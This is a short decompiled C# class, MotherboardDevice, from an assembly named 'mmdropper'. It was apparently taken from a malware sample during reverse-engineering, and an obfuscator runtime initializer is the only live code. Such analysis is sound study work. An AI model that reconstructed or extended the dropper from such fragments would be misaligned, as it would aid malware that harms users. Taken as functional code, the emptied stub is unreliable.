﻿// Decompiled with JetBrains decompiler
// Type: MotherboardDevice
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Documents\GitHub\MrsMajor5.0\AgileStringDecryptor-master\bin\Debug\net48\eulascr-Utf8Fixed.exe

using System.Management;
using System.Runtime.CompilerServices;

internal class MotherboardDevice : BaseWin32Entity
{
  [MethodImpl(MethodImplOptions.NoInlining)]
  public MotherboardDevice(ManagementBaseObject obj)
    : base((ManagementBaseObject) null)
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public override string ToString() => (string) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static MotherboardDevice()
  {
    AgileDotNetRT.Initialize();
    AgileDotNetRT.PostInitialize();
  }
}